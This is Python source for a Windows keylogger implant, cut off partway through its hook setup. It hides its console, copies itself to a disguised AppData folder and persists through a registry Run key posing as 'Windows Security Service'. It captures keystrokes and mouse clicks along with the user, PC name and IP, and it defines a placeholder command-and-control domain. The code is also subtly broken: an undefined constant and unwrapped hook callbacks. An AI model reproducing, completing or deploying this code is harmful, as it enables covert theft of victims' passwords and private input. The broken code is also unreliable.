import sys
import os
import ctypes
import ctypes.wintypes
import time
import threading
import socket
import struct
import zlib
import base64
import json
import platform
import requests
import uuid
import winreg

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32
shell32 = ctypes.windll.shell32
gdi32 = ctypes.windll.gdi32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
WM_LBUTTONDOWN = 0x0201
WM_RBUTTONDOWN = 0x0204

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", ctypes.wintypes.DWORD),
                ("scanCode", ctypes.wintypes.DWORD),
                ("flags", ctypes.wintypes.DWORD),
                ("time", ctypes.wintypes.DWORD),
                ("dwExtraInfo", ctypes.wintypes.ULONG_PTR)]

class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class MSLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("pt", POINT),
                ("mouseData", ctypes.wintypes.DWORD),
                ("flags", ctypes.wintypes.DWORD),
                ("time", ctypes.wintypes.DWORD),
                ("dwExtraInfo", ctypes.wintypes.ULONG_PTR)]

APPDATA = os.environ.get('APPDATA', '')
INSTALL_PATH = os.path.join(APPDATA, 'Microsoft', 'Windows', 'SystemApps')
LOG_FILE = os.path.join(INSTALL_PATH, 'log.txt')
C2_DOMAIN = "https://tu-c2-server.com"
BEACON_INTERVAL = 120
KEYBOARD_LOG_INTERVAL = 30

keyboard_buffer = []
stop_event = threading.Event()

def get_ip():
    try:
        hostname = socket.gethostname()
        ips = socket.gethostbyname_ex(hostname)[2]
        for ip in ips:
            if not ip.startswith("127.") and "." in ip:
                return ip
    except Exception:
        pass
    return "Unknown"

def hide_console():
    kernel32.FreeConsole()
    hwnd = kernel32.GetConsoleWindow()
    if hwnd:
        user32.ShowWindow(hwnd, 0)

def create_mutex():
    mutex = kernel32.CreateMutexW(None, True, f"Global\\{uuid.uuid4().hex}")
    if kernel32.GetLastError() == 0xB7:
        kernel32.CloseHandle(mutex)
        sys.exit(0)
    return mutex

def setup_persistence():
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(__file__)
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "Windows Security Service", 0, winreg.REG_SZ, f'"{exe_path}"')
    except Exception:
        pass

def write_log(data):
    try:
        os.makedirs(INSTALL_PATH, exist_ok=True)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {data}\n")
    except Exception:
        pass

def on_key_press(nCode, wParam, lParam):
    if nCode >= 0 and (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN):
        kb_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk_code = kb_struct.vkCode
        try:
            char = chr(vk_code)
            keyboard_buffer.append(char)
        except ValueError:
            keyboard_buffer.append(f"[VK:{vk_code}]")
    return user32.CallNextHookExW(None, nCode, wParam, lParam)

def on_mouse_click(nCode, wParam, lParam):
    if nCode >= 0 and (wParam == WM_LBUTTONDOWN or wParam == WM_RBUTTONDOWN):
        ms_struct = ctypes.cast(lParam, ctypes.POINTER(MSLLHOOKSTRUCT)).contents
        x, y = ms_struct.pt.x, ms_struct.pt.y
        button = "L" if wParam == WM_LBUTTONDOWN else "R"
        keyboard_buffer.append(f"[M{button}@{x},{y}]")
    return user32.CallNextHookExW(None, nCode, wParam, lParam)

def logger_thread():
    ip = get_ip()
    write_log(f"===== SESSION START =====")
    write_log(f"IP: {ip}")
    write_log(f"User: {os.environ.get('USERNAME', 'Unknown')}")
    write_log(f"PC: {os.environ.get('COMPUTERNAME', 'Unknown')}")
    
    while not stop_event.is_set():
        time.sleep(KEYBOARD_LOG_INTERVAL)
        if keyboard_buffer:
            log_entry = "".join(keyboard_buffer)
            write_log(f"LOG: {log_entry}")
            keyboard_buffer.clear()

def start_hooks():
    keyboard_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, on_key_press, kernel32.GetModuleHandleW(None), 0)
    mouse_hook = user32.SetWindowsHookExW(WH_MOUSE_LL, on_mouse_click, kernel32.GetModuleHandleW(None), 0)
    